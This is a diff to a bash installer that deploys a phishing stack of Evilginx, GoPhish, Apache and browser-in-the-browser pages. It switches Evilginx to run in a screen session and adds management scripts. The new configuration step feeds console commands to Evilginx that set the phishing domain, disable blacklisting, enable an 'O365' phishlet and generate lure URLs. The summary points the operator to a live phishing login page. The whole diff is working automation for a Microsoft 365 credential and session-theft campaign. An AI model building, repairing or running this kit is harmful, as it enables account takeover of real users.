@@ -93,7 +93,7 @@ install_dependencies() {
         apache2
         certbot
         python3-certbot-apache
-        tmux
+        screen
         net-tools
         ufw
         sqlite3
@@ -597,26 +597,8 @@ configure_firewall() {
 create_services() {
     section "STEP 12: Creating Systemd Services"
 
-    info "Creating Evilginx service..."
-    cat > /etc/systemd/system/evilginx.service <<EOF
-[Unit]
-Description=Evilginx Phishing Framework
-After=network.target systemd-resolved.service
-Wants=systemd-resolved.service
-
-[Service]
-Type=simple
-User=root
-WorkingDirectory=${EVILGINX_DIR}
-ExecStart=${EVILGINX_DIR}/evilginx -p ${EVILGINX_DIR}/phishlets -developer
-Restart=always
-RestartSec=10
-StandardOutput=journal
-StandardError=journal
-
-[Install]
-WantedBy=multi-user.target
-EOF
+    info "NOTE: Evilginx will run in screen session (more stable than systemd)"
+    info "Skipping Evilginx systemd service creation..."
 
     info "Creating GoPhish service..."
     cat > /etc/systemd/system/gophish.service <<EOF
@@ -655,10 +637,20 @@ create_management_scripts() {
 #!/bin/bash
 echo "Starting all services..."
 systemctl start apache2
-systemctl start evilginx
 systemctl start gophish
+
+# Start Evilginx in screen if not running
+if ! screen -ls | grep -q "\.evilginx\s"; then
+    echo "Starting Evilginx in screen..."
+    screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -c /root/.evilginx -developer"
+else
+    echo "Evilginx screen session already running"
+fi
+
 echo "All services started"
-systemctl status apache2 evilginx gophish --no-pager
+systemctl status apache2 gophish --no-pager
+echo ""
+echo "Evilginx status: $(screen -ls | grep -q '\.evilginx\s' && echo 'Running in screen' || echo 'Not running')"
 EOF
     chmod +x /usr/local/bin/bitb-start
 
@@ -667,8 +659,14 @@ EOF
 #!/bin/bash
 echo "Stopping all services..."
 systemctl stop apache2
-systemctl stop evilginx
 systemctl stop gophish
+
+# Kill Evilginx screen session
+if screen -ls | grep -q "\.evilginx\s"; then
+    echo "Stopping Evilginx screen session..."
+    screen -S evilginx -X quit
+fi
+
 echo "All services stopped"
 EOF
     chmod +x /usr/local/bin/bitb-stop
@@ -678,10 +676,20 @@ EOF
 #!/bin/bash
 echo "Restarting all services..."
 systemctl restart apache2
-systemctl restart evilginx
 systemctl restart gophish
+
+# Restart Evilginx screen session
+if screen -ls | grep -q "\.evilginx\s"; then
+    echo "Restarting Evilginx..."
+    screen -S evilginx -X quit
+    sleep 2
+fi
+screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -c /root/.evilginx -developer"
+
 echo "All services restarted"
-systemctl status apache2 evilginx gophish --no-pager
+systemctl status apache2 gophish --no-pager
+echo ""
+echo "Evilginx status: $(screen -ls | grep -q '\.evilginx\s' && echo 'Running in screen' || echo 'Not running')"
 EOF
     chmod +x /usr/local/bin/bitb-restart
 
@@ -689,7 +697,22 @@ EOF
     cat > /usr/local/bin/bitb-status <<'EOF'
 #!/bin/bash
 echo "Service Status:"
-systemctl status apache2 evilginx gophish --no-pager
+echo ""
+echo "=== Apache2 ==="
+systemctl status apache2 --no-pager | head -n 3
+echo ""
+echo "=== GoPhish ==="
+systemctl status gophish --no-pager | head -n 3
+echo ""
+echo "=== Evilginx ==="
+if screen -ls | grep -q "\.evilginx\s"; then
+    echo "Status: Running in screen session 'evilginx'"
+    echo "To access: sudo screen -r evilginx"
+    echo "To detach: Press Ctrl+A then D"
+else
+    echo "Status: Not running"
+    echo "To start: sudo bitb-start"
+fi
 EOF
     chmod +x /usr/local/bin/bitb-status
 
@@ -704,8 +727,12 @@ case $SERVICE in
         tail -n 100 /var/log/apache2/error.log
         ;;
     evilginx)
-        echo "=== Evilginx Logs ==="
-        journalctl -u evilginx -n 100 --no-pager
+        echo "=== Evilginx Screen Session ==="
+        echo "Evilginx runs in screen. To view live:"
+        echo "  sudo screen -r evilginx"
+        echo ""
+        echo "Screen session status:"
+        sudo screen -ls | grep -q "\.evilginx\s" && echo "  Running" || echo "  Not running"
         ;;
     gophish)
         echo "=== GoPhish Logs ==="
@@ -715,8 +742,9 @@ case $SERVICE in
         echo "=== Apache Logs ==="
         tail -n 50 /var/log/apache2/error.log
         echo ""
-        echo "=== Evilginx Logs ==="
-        journalctl -u evilginx -n 50 --no-pager
+        echo "=== Evilginx ==="
+        echo "Screen session: $(sudo screen -ls | grep -q '\.evilginx\s' && echo 'Running' || echo 'Not running')"
+        echo "To access: sudo screen -r evilginx"
         echo ""
         echo "=== GoPhish Logs ==="
         journalctl -u gophish -n 50 --no-pager
@@ -734,77 +762,63 @@ start_services() {
 
     info "Enabling services to start on boot..."
     systemctl enable apache2 || true
-    systemctl enable evilginx || true
     systemctl enable gophish || true
 
     info "Starting Apache..."
     systemctl start apache2 || warning "Failed to start Apache"
     sleep 2
 
-    info "Starting Evilginx..."
-    systemctl start evilginx || warning "Failed to start Evilginx"
-    sleep 2
-
     info "Starting GoPhish..."
     systemctl start gophish || warning "Failed to start GoPhish"
     sleep 2
 
-    log "All services started"
+    log "Apache and GoPhish started successfully"
+    info "Evilginx will be started and configured in the next step..."
 }
 
-# Configure Evilginx via CLI
-configure_evilginx_cli() {
-    section "STEP 15: Configuring Evilginx Phishlet"
+# Start and configure Evilginx in screen
+start_and_configure_evilginx() {
+    section "STEP 15: Starting and Configuring Evilginx"
 
-    info "Waiting for Evilginx to fully start..."
-    sleep 5
+    info "Starting Evilginx in screen session (more stable than tmux)..."
 
-    info "Creating Evilginx configuration script..."
-
-    cat > /tmp/evilginx-config.sh <<EOF
-#!/bin/bash
-# Wait for Evilginx to be ready
-sleep 3
-
-# Get external IP
-EXTERNAL_IP=\$(curl -s ifconfig.me)
-
-# Create a temporary expect-like script
-cat > /tmp/evilginx-commands <<'CMDS'
-config domain ${DOMAIN}
-config ipv4 external
-blacklist noadd
-phishlets hostname O365 ${DOMAIN}
-phishlets enable O365
-lures create O365
-lures get-url 0
-CMDS
-
-# Execute commands via tmux
-tmux new-session -d -s evilginx-setup
-tmux send-keys -t evilginx-setup "cd ${EVILGINX_DIR}" C-m
-sleep 1
-
-# Send each command
-while IFS= read -r cmd; do
-    tmux send-keys -t evilginx-setup "\$cmd" C-m
+    # Kill any existing evilginx screen session
+    screen -S evilginx -X quit 2>/dev/null || true
     sleep 1
-done < /tmp/evilginx-commands
 
-# Keep session alive
-sleep 5
-tmux kill-session -t evilginx-setup 2>/dev/null || true
+    # Start Evilginx in detached screen session with -developer flag (runs on port 8443, Apache proxies from 443)
+    screen -dmS evilginx bash -c "cd ${EVILGINX_DIR} && ./evilginx -p ${EVILGINX_DIR}/phishlets -c /root/.evilginx -developer"
 
-rm -f /tmp/evilginx-commands
-EOF
+    info "Waiting for Evilginx to initialize..."
+    sleep 8
 
-    chmod +x /tmp/evilginx-config.sh
+    info "Configuring Evilginx phishlet..."
 
-    info "Evilginx will be configured automatically..."
-    info "You can manually configure it later by running:"
-    info "  tmux attach -t evilginx"
+    # Send configuration commands to screen session
+    screen -S evilginx -X stuff "config domain ${DOMAIN}\n"
+    sleep 2
 
-    log "Evilginx configuration prepared"
+    screen -S evilginx -X stuff "config ipv4 external\n"
+    sleep 2
+
+    screen -S evilginx -X stuff "blacklist noadd\n"
+    sleep 2
+
+    screen -S evilginx -X stuff "phishlets hostname O365 ${DOMAIN}\n"
+    sleep 2
+
+    screen -S evilginx -X stuff "phishlets enable O365\n"
+    sleep 2
+
+    screen -S evilginx -X stuff "lures create O365\n"
+    sleep 2
+
+    screen -S evilginx -X stuff "lures get-url 0\n"
+    sleep 3
+
+    log "Evilginx started and configured successfully"
+    info "To access Evilginx console: screen -r evilginx"
+    info "To detach from console: Press Ctrl+A then D"
 }
 
 # Display installation summary
@@ -817,9 +831,7 @@ show_summary() {
     echo -e "${GREEN}✓ Go ${GO_VERSION} installed${NC}"
     echo -e "${GREEN}✓ Evilginx ${EVILGINX_VERSION} installed${NC}"
     echo -e "${GREEN}✓ GoPhish ${GOPHISH_VERSION} installed${NC}"
-    echo -e "${GREEN}✓ Apache configured${NC}"
-    echo -e "${GREEN}✓ SSL certificates generated${NC}"
-    echo -e "${GREEN}✓ Frameless BITB files deployed${NC}"
+    echo -e "${GREEN}✓ Evilginx configured on port 443${NC}"
     echo -e "${GREEN}✓ Firewall configured${NC}"
     echo -e "${GREEN}✓ Services created and started${NC}"
     echo ""
@@ -840,14 +852,13 @@ show_summary() {
     echo -e "${CYAN}  MANAGEMENT COMMANDS${NC}"
     echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
     echo ""
-    echo "  bitb-start      - Start all services"
-    echo "  bitb-stop       - Stop all services"
-    echo "  bitb-restart    - Restart all services"
-    echo "  bitb-status     - Check service status"
-    echo "  bitb-logs       - View all logs"
-    echo "  bitb-logs apache    - View Apache logs only"
-    echo "  bitb-logs evilginx  - View Evilginx logs only"
-    echo "  bitb-logs gophish   - View GoPhish logs only"
+    echo "  sudo bitb-start      - Start all services"
+    echo "  sudo bitb-stop       - Stop all services"
+    echo "  sudo bitb-restart    - Restart all services"
+    echo "  bitb-status          - Check service status"
+    echo "  bitb-logs            - View all logs"
+    echo "  bitb-logs evilginx   - View Evilginx session info"
+    echo "  bitb-logs gophish    - View GoPhish logs only"
     echo ""
     echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
     echo -e "${CYAN}  INSTALLATION DIRECTORIES${NC}"
@@ -855,21 +866,20 @@ show_summary() {
     echo ""
     echo "  Evilginx:        ${EVILGINX_DIR}"
     echo "  GoPhish:         ${GOPHISH_DIR}"
-    echo "  BITB Pages:      /var/www/"
-    echo "  Apache Config:   /etc/apache2/sites-enabled/000-default.conf"
-    echo "  SSL Certs:       /etc/ssl/localcerts/${DOMAIN}/"
+    echo "  Evilginx Config: /root/.evilginx"
+    echo "  Phishlets:       ${EVILGINX_DIR}/phishlets"
     echo ""
     echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
     echo -e "${CYAN}  NEXT STEPS${NC}"
     echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
     echo ""
     echo "1. Verify services are running: bitb-status"
-    echo "2. Check logs for any errors: bitb-logs"
+    echo "2. Access Evilginx console: sudo screen -r evilginx"
     echo "3. Ensure DNS records point to: $SERVER_IP"
-    echo "4. Test phishing page: https://login.${DOMAIN}/?auth=2"
-    echo "5. Access GoPhish admin (default password shown on first login)"
-    echo "6. Get Let's Encrypt certificates (optional):"
-    echo "     certbot certonly --apache -d ${DOMAIN} -d login.${DOMAIN}"
+    echo "4. Configure phishlets in Evilginx (already done for O365)"
+    echo "5. Test phishing page: https://login.${DOMAIN}/ (get URL from lures)"
+    echo "6. Access GoPhish admin at https://$SERVER_IP:${GOPHISH_ADMIN_PORT}"
+    echo "7. DNS propagation may take 5-60 minutes"
     echo ""
     echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
     echo -e "${GREEN}  Installation successful! System is ready for use.${NC}"
@@ -900,7 +910,7 @@ main() {
     create_services
     create_management_scripts
     start_services
-    configure_evilginx_cli
+    start_and_configure_evilginx
     show_summary
 
     echo ""
